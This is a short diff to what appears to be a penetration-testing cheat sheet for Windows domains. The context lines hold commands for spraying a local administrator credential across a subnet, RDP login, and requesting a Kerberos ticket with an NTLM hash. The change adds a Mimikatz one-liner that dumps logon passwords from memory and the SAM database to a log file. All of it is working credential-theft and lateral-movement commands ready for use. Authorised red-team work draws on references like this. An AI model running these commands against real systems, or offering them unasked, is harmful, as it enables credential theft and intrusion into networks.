@@ -16,3 +16,5 @@ Local Administrator Password----crackmapexec smb 192.168.0.0/24 -u Administrator
 
 Remote Desktop----xfreerdp /u:DOMAIN\user /p:<pass> /v:<ip>
 Rubeus (get TGT and apply to new process)----Rubeus.exe asktgt /user:<user> /rc4:<NTLM hash> /createnetonly:cmd.exe /show /domain:<domain> /dc:<dc-ip>
+
+Mimikatz programmatically dump passwords----mimikatz.exe "privilege::debug" "log .\logs\Result.txt" "sekurlsa::logonPasswords" "token::elevate" "lsadump::sam" exit
